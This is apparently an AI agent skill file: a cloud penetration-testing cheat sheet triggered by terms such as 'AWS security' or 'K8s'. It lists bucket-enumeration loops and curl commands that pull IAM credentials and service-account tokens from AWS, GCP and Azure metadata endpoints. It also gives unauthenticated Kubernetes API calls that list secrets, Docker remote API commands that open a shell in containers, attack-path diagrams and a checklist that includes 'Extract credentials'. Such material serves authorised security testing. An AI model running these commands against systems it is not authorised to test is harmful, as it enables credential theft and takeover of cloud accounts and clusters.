name: cloud-security
description: Cloud security assessment — AWS, GCP, Azure, cloud misconfigurations, S3 buckets, IAM enumeration, cloud metadata SSRF, Kubernetes
trigger:
  - cloud security
  - AWS security
  - GCP security
  - Azure security
  - S3 bucket
  - cloud misconfiguration
  - Kubernetes
  - K8s
  - cloud pentest

---

# CLOUD SECURITY TESTING

## AWS ENUMERATION

### S3 Bucket Testing
```bash
# Public bucket listing
aws s3 ls s3://bucket-name --no-sign-request

# Bucket enumeration
for name in bucket bucket-test bucket-dev bucket-staging bucket-prod bucket-backup; do
  aws s3 ls s3://$name --no-sign-request 2>/dev/null && echo "FOUND: $name"
done

# HTTP enumeration
curl -s https://bucket-name.s3.amazonaws.com/
curl -s https://bucket-name.s3.region.amazonaws.com/

# Common bucket names
target target-dev target-staging target-prod target-test
target-assets target-uploads target-files target-public
target-backup target-storage target-media
```

### AWS API Testing
```bash
# Try using EC2 metadata
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Try to enumerate AWS keys (if found)
aws ec2 describe-regions
aws s3 ls
aws lambda list-functions
aws iam list-users
```

### AWS Misconfigs
| Service | Misconfig | Impact |
| S3 | Public read | Data leak |
| S3 | Public write | Malware upload |
| EC2 | Metadata accessible | Credential theft |
| Lambda | Env vars exposed | Key leak |
| IAM | Overly permissive | Privilege escalation |
| CloudFront | Misconfigured CORS | Data exfil |

---

# GCP ENUMERATION

### GCP Metadata
```bash
# GCP metadata endpoint (requires header)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/
  
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### GCP Buckets
```bash
# List buckets
gsutil ls

# Public access
gsutil iam get gs://bucket-name
```

---

# AZURE ENUMERATION

### Azure Metadata
```bash
# Azure metadata
curl -H "Metadata: true" \
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Azure Storage
```bash
# List storage accounts
az storage account list

# Public blobs
az storage blob list --container-name public
```

---

# KUBERNETES SECURITY

### K8s API Discovery
```bash
# Unauthenticated API
curl -k https://kubernetes:6443/api/v1/namespaces/default/pods

# List all pods
curl -k https://kubernetes:6443/api/v1/pods

# List secrets
curl -k https://kubernetes:6443/api/v1/namespaces/kube-system/secrets
```

### Kubernetes Vulnerabilities
| Finding | Impact |
| Unauthenticated API | Full cluster access |
| Default service account | Pod code execution |
| Secrets in etcd | Credential theft |
| Container escape | Node compromise |
| HostPath volumes | Host filesystem access |
| Privileged containers | Container escape |

### Common K8s Endpoints
```bash
/api/v1/pods
/api/v1/secrets
/api/v1/configmaps
/api/v1/namespaces
/apis/apps/v1/deployments
/apis/networking.k8s.io/v1/ingresses
```

### Docker Enumeration
```bash
# Docker API
curl -s http://target:2375/containers/json
curl -s http://target:2375/images/json

# List containers
docker -H tcp://target:2375 ps -a

# Execute in container
docker -H tcp://target:2375 exec -it container_id /bin/sh
```

---

# CLOUD ATTACK MATRIX

## AWS Attack Path
```
SSRF -> EC2 Metadata -> Credentials -> 
  -> S3 Access -> Data
  -> Lambda -> RCE
  -> Database -> Data
  -> Account Takeover
```

## Azure Attack Path
```
SSRF -> VM Metadata -> Credentials ->
  -> Storage -> Data
  -> Key Vault -> Keys
  -> Account Takeover
```

## GCP Attack Path
```
SSRF -> GCP Metadata -> Credentials ->
  -> Storage -> Data
  -> Compute -> RCE
  -> Project Takeover
```

## K8s Attack Path
```
K8s API (unauth) -> Secrets -> 
  -> Secrets in pods -> Application keys
  -> Pod exec -> Node escape
  -> HostPath -> Node compromise
```

---

# CLOUD RECON TOOLS

```bash
# CloudEnum
pip install cloud_enum
cloudenum --domains target.com

# CloudMapper
cloudmapper.py enum --domain target.com

# Pacu
python pacu.py
```

---

# WORDLISTS

## AWS Wordlists
```
bucket-names:
target target-assets target-public target-uploads
target-dev target-staging target-prod target-test
www s3 assets static files media
backup storage data uploads

region:
us-east-1 us-west-2 eu-west-1 ap-southeast-1
```

## Azure Wordlists
```
storage-account-names:
targetstorage targetstore targetblob targetfiles
dev staging prod test backup
```

---

# CLOUD SECURITY CHECKLIST

## S3 Buckets
- [ ] Enumerate bucket names
- [ ] Test public access
- [ ] Test listing
- [ ] Test upload
- [ ] Check ACLs
- [ ] Check bucket policies

## EC2/VM Metadata
- [ ] Test SSRF to 169.254.169.254
- [ ] Extract credentials
- [ ] Enumerate resources

## Kubernetes
- [ ] Test unauthenticated API
- [ ] List pods
- [ ] List secrets
- [ ] Check container privileges

## Azure/GCP
- [ ] Test metadata endpoints
- [ ] Enumerate storage
- [ ] Test key vaults